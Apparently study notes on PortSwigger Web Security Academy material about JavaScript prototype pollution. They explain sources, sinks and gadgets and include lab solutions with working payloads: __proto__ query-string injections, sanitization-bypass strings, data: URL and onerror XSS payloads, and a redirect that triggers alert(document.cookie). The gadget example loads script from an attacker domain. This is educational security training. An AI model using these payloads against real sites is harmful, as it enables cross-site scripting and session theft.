								💠️ prototype pollution

⚪️ What is prototype pollution?
				
▫️ Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. 

▫️ Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. 
▫️ If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. 
▫️ In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution. 			

								💠️ JavaScript prototypes and inheritance
								
▫️ JavaScript uses a prototypal inheritance model, which is quite different from the class-based model used by many other languages.

◽️ What is an object in JavaScript?

▫️A JavaScript object is essentially just a collection of key:value pairs known as "properties". For example, the following object could represent a user: 

const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}						

▫️ You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys:

user.username     // "wiener"
user['userId']    // 01234

▫️ As well as data, properties may also contain executable functions. In this case, the function is known as a "method". 

const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}

▫️ The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values.

▫️ However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals. 

								💠️ What is a prototype in JavaScript?

▫️ Every object in JavaScript is linked to another object of some kind, known as its prototype. 
▫️ By default, JavaScript automatically assigns new objects one of its built-in prototypes. 
▫️ For example, strings are automatically assigned the built-in String.prototype. You can see some more examples of these global prototypes below: 

			let myObject = {};
			Object.getPrototypeOf(myObject);    // Object.prototype

			let myString = "";
			Object.getPrototypeOf(myString);    // String.prototype

			let myArray = [];
			Object.getPrototypeOf(myArray);	    // Array.prototype

			let myNumber = 1;
			Object.getPrototypeOf(myNumber);    // Number.prototype

▫️ Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. 
▫️ This enables developers to create new objects that can reuse the properties and methods of existing objects. 

▫️ The built-in prototypes provide useful properties and methods for working with basic data types. 
▫️ For example, the String.prototype object has a toLowerCase() method. 
▫️ As a result, all strings automatically have a ready-to-use method for converting them to lowercase. 
▫️ This saves developers having to manually add this behavior to each new string that they create. 


◽️ How does object inheritance work in JavaScript?

▫️ Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. 
▫️ If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead.

							💠️ The prototype chain

▫️ Note that an object's prototype is just another object, which should also have its own prototype, and so on. 
▫️ As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null. 

▫️ Crucially, objects inherit properties not just from their immediate prototype, but from all objects above them in the prototype chain. 
▫️ In the example above, this means that the username object has access to the properties and methods of both String.prototype and Object.prototype. 

							💠️ Accessing an object's prototype using __proto__

▫️ Every object has a special property that you can use to access its prototype. 
▫️ Although this doesn't have a formally standardized name, __proto__ is the de facto standard used by most browsers. 
▫️ If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. 
▫️ This means you can use it to read the prototype and its properties, and even reassign them if necessary. 

▫️  As with any property, you can access __proto__ using either bracket or dot notation: 

username.__proto__
username['__proto__']

▫️ You can even chain references to __proto__ to work your way up the prototype chain: 

username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null

								💠️ Modifying prototypes

▫️ Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. 
▫️ This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations. 							

▫️ For example, modern JavaScript provides the trim() method for strings, which enables you to easily remove any leading or trailing whitespace. 
▫️ Before this built-in method was introduced, developers sometimes added their own custom implementation of this behavior to the String.prototype object by doing something like this: 

 String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}

▫️Thanks to the prototypal inheritance, all strings would then have access to this method: 

let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"

								💠️ How do prototype pollution vulnerabilities arise?

▫️ Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.

▫️ This can allow an attacker to inject a property with a key like __proto__, along with arbitrary nested properties.

▫️ Due to the special meaning of __proto__ in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. 
▫️ As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way. 
								

▫️ It's possible to pollute any prototype object, but this most commonly occurs with the built-in global Object.prototype. 

◽️  Successful exploitation of prototype pollution requires the following key components:



    🔸️ A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.

    🔸️ A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.

    🔸️ An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

◽️ Prototype pollution sources

▫️ A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows: 



    🔸️ The URL via either the query or fragment string (hash)

    🔸️ JSON-based input

    🔸️ Web messages

🔴️ Prototype pollution via the URL

▫️ Consider the following URL, which contains an attacker-constructed query string: 

----->	https://vulnerable-website.com/?__proto__[evilProperty]=payload

▫️ When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string. 
▫️But let's look at what happens if these keys and values are subsequently merged into an existing object as properties. 

▫️ You might think that the __proto__ property, along with its nested evilProperty, will just be added to the target object as follows: 

{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}

▫️ However, this isn't the case. At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: 

targetObject.__proto__.evilProperty = 'payload';

▫️ During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype. 
▫️ As a result, evilProperty is assigned to the returned prototype object rather than the target object itself. 
▫️ Assuming that the target object uses the default Object.
▫️ prototype, all objects in the JavaScript runtime will now inherit evilProperty, unless they already have a property of their own with a matching key. 

▫️ In practice, injecting a property called evilProperty is unlikely to have any effect. 
▫️ However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries. 


🔴️ Prototype pollution via JSON input

▫️ User-controllable objects are often derived from a JSON string using the JSON.parse() method. Interestingly, JSON.parse() also treats any key in the JSON object as an arbitrary string, including things like __proto__. 


▫️ This provides another potential vector for prototype pollution. 

{
    "__proto__": {
        "evilProperty": "payload"
    }
}

▫️ If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key __proto__: 


const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true

🔴️ Prototype pollution sinks

▫️ A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands.

▫️ As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. 
▫️ Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place. 

🔴️ Prototype pollution gadgets

▫️ A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is: 

🔸️ Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
🔸️ Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker. 

▫️ A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype.
▫️ Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all. 

🔴️ Example of a prototype pollution gadget

▫️ Many JavaScript libraries accept an object that developers can use to set different configuration options. 
▫️ The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. 
▫️ If a property that represents a particular option is not present, a predefined default option is often used instead. 
▫️ A simplified example may look something like this: 

	let transport_url = config.transport_url || defaults.transport_url;

▫️  Now imagine the library code uses this transport_url to add a script reference to the page: 

	let script = document.createElement('script');
	script.src = `${transport_url}/example.js`;
	document.body.appendChild(script);


▫️ If the website's developers haven't set a transport_url property on their config object, this is a potential gadget. 
▫️ In cases where an attacker is able to pollute the global Object.prototype with their own transport_url property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing. 

▫️  If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain: 

	https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net

▫️  By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows: 

	https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//

▫️  Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix. 



								🔴️ Client-side prototype pollution vulnerabilities

◽️ Finding client-side prototype pollution sources manually

▫️ Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to Object.prototype until you find a source that works. 


🔸️STEPS:

🔺️ Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
vulnerable-website.com/?__proto__[foo]=bar


🔺️ In your browser console, inspect Object.prototype to see if you have successfully polluted it with your arbitrary property: 

Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful

🔺️ If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa: 

vulnerable-website.com/?__proto__.foo=bar

🔺️ Repeat this process for each potential source.


💠️ Finding client-side prototype pollution sources using DOM Invader

▫️ As you can see, finding prototype pollution sources manually can be a fairly tedious process. Instead, we recommend using DOM Invader, which comes preinstalled with Burp's built-in browser. 
▫️ DOM Invader is able to automatically test for prototype pollution sources as you browse, which can save you a considerable amount of time and effort.

					
								🔴️ Finding client-side prototype pollution gadgets manually
								
▫️ Once you've identified a source that lets you add arbitrary properties to the global Object.prototype, the next step is to find a suitable gadget that you can use to craft an exploit. 
▫️In practice, we recommend using DOM Invader to do this, but it's useful to look at the manual process as it may help solidify your understanding of the vulnerability. 

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports. 
2. In Burp, enable response interception (Proxy > Options > Intercept server responses) and intercept the response containing the JavaScript that you want to test. 
3. Add a debugger statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The debugger statement pauses execution of the script.
5. While the script is still paused, switch to the console and enter the following command, replacing YOUR-PROPERTY with one of the properties that you think is a potential gadget: 

Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})

🔺️ The property is added to the global Object.prototype, and the browser will log a stack trace to the console whenever it is accessed. 

6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application. 

7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval(). 
9. Repeat this process for any properties that you think are potential gadgets.


💠️ Finding client-side prototype pollution gadgets using DOM Invader


⚪️ Lab: DOM XSS via client-side prototype pollution

◽️ Find a prototype pollution source

1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string:/?__proto__[foo]=bar

2. Open the browser DevTools panel and go to the Console tab.

3. Enter Object.prototype.

4. Study the properties of the returned object. Observe that it now has a foo property with the value bar. You've successfully found a prototype pollution source.

◽️ Identify a gadget

1. In the browser DevTools panel, go to the Sources tab.

2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.

3. In searchLogger.js, notice that if the config object has a transport_url property, this is used to dynamically append a script to the DOM.

4. Notice that no transport_url property is defined for the config object. This is a potential gadget for controlling the src of the <script> element.

◽️  Craft an exploit 

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property:/?__proto__[transport_url]=foo

2. In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo.

3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows:/?__proto__[transport_url]=data:,alert(1);

◽️  Observe that the alert(1) is called and the lab is solved. 

💠️ Lab: DOM XSS via an alternative prototype pollution vector

Solution:
------------------------------------------------------------------------------------------
    In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string:
    /?__proto__[foo]=bar

    Open the browser DevTools panel and go to the Console tab.

    Enter Object.prototype.

    Study the properties of the returned object and observe that your injected foo property has not been added.

    Back in the query string, try using an alternative prototype pollution vector:
    /?__proto__.foo=bar

    In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar. You've successfully found a prototype pollution source.

◽️ Identify a gadget

    In the browser DevTools panel, go to the Sources tab.

    Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.

    Notice that there is an eval() sink in searchLoggerAlternative.js.

    Notice that the manager.sequence property is passed to eval(), but this isn't defined by default.

◽️ Craft an exploit

    Using the prototype pollution source you identified earlier, try injecting an arbitrary sequence property containing an XSS proof-of-concept payload:
    /?__proto__.sequence=alert(1)

    Observe that the payload doesn't execute.

    In the browser DevTools panel, go to the Console tab. Observe that you have triggered an error.

    Click the link at the top of the stack trace to jump to the line where eval() is called.

    Click the line number to add a breakpoint to this line, then refresh the page.

    Hover the mouse over the manager.sequence reference and observe that its value is alert(1)1. This indicates that we have successfully passed our payload into the sink, but a numeric 1 character is being appended to it, resulting in invalid JavaScript syntax.

    Click the line number again to remove the breakpoint, then click the play icon at the top of the browser window to resume code execution.

    Add trailing minus character to the payload to fix up the final JavaScript syntax:
    /?__proto__.sequence=alert(1)-

    Observe that the alert(1) is called and the lab is solved.
==========================================================================================


									🔴️ Prototype pollution via the constructor

◽️So far, we've looked exclusively at how you can get a reference to prototype objects via the special __proto__ accessor property. As this is the classic technique for prototype pollution, a common defense is to strip any properties with the key __proto__ from user-controlled objects before merging them. This approach is flawed as there are alternative ways to reference Object.prototype without relying on the __proto__ string at all. 

◽️ Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the constructor function that was used to create it. For example, you can create a new object either using literal syntax or by explicitly invoking the Object() constructor as follows: 

		let myObjectLiteral = {};
		let myObject = new Object();

▫️  You can then reference the Object() constructor via the built-in constructor property:

myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}

▫️ Remember that functions are also just objects under the hood. Each constructor function has a prototype property, which points to the prototype that will be assigned to any objects that are created by this constructor. As a result, you can also access any object's prototype as follows: 

	myObject.constructor.prototype        // Object.prototype
	myString.constructor.prototype        // String.prototype
	myArray.constructor.prototype         // Array.prototype

▫️ As myObject.constructor.prototype is equivalent to myObject.__proto__, this provides an alternative vector for prototype pollution. 

									🔴️ Bypassing flawed key sanitization

▫️ An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object. However, a common mistake is failing to recursively sanitize the input string. For example, consider the following URL: 

vulnerable-website.com/?__pro__proto__to__.gadget=payload

▫️ If the sanitization process just strips the string __proto__ without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source: 

	vulnerable-website.com/?__proto__.gadget=payload									

▫️ Try alternative prototype pollution vectors. For example:
	/?__proto__[foo]=bar
	/?constructor.prototype.foo=bar

▫️Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example: 

	/?__pro__proto__to__[foo]=bar
	/?__pro__proto__to__.foo=bar
	/?constconstructorructor.[protoprototypetype][foo]=bar
	/?constconstructorructor.protoprototypetype.foo=bar

 /?__pro__proto__to__[transport_url]=data:,alert(1);


								🔴️ Prototype pollution in external libraries
								
▫️ As we've touched on already, prototype pollution gadgets may occur in third-party libraries that are imported by the application. In this case, we strongly recommend using DOM Invader's prototype pollution features to identify sources and gadgets. Not only is this much quicker, it also ensures you won't miss vulnerabilities that would otherwise be extremely tricky to notice. 

💠️ Lab: Client-side prototype pollution in third-party libraries								

Solution: 

<script>
    location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>

								🔴️ Prototype pollution via browser APIs

▫️You may be surprised to learn that there are a number of widespread prototype pollution gadgets in the JavaScript APIs commonly provided in browsers. 

⚪️ Prototype pollution via fetch()

▫️ The Fetch API provides a simple way for developers to trigger HTTP requests using JavaScript. The fetch() method accepts two arguments:

    🔸️The URL to which you want to send the request.

    🔸️An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on.

▫️ The following is an example of how you might send a POST request using fetch():
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})

▫️ As you can see, we've explicitly defined method and body properties, but there are a number of other possible properties that we've left undefined. In this case, if an attacker can find a suitable source, they could potentially pollute Object.prototype with their own headers property. This may then be inherited by the options object passed into fetch() and subsequently used to generate the request.

▫️ This can lead to a number of issues. For example, the following code is potentially vulnerable to DOM XSS via prototype pollution:

fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);

▫️ To exploit this, an attacker could pollute Object.prototype with a headers property containing a malicious x-username header as follows:

?__proto__[headers][x-username]=<img/src/onerror=alert(1)>

▫️ Let's assume that server-side, this header is used to set the value of the x-username property in the returned JSON file. In the vulnerable client-side code above, this is then assigned to the username variable, which is later passed into the innerHTML sink, resulting in DOM XSS. 								


⚪️ Prototype pollution via Object.defineProperty()

▫️ Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the Object.defineProperty() method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:

Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})

▫️ This may initially seem like a reasonable mitigation attempt as this prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain. However, this approach is inherently flawed.

▫️Just like the fetch() method we looked at earlier, Object.defineProperty() accepts an options object, known as a "descriptor". You can see this in the example above. Among other things, developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.

▫️ In this case, an attacker may be able to bypass this defense by polluting Object.prototype with a malicious value property. If this is inherited by the descriptor object passed to Object.defineProperty(), the attacker-controlled value may be assigned to the gadget property after all. 


Lab: Client-side prototype pollution via browser APIs
Solution: https://0a3e00cb03146dc184d15e84004500e1.web-security-academy.net/?__proto__[value]=data:,alert(1)











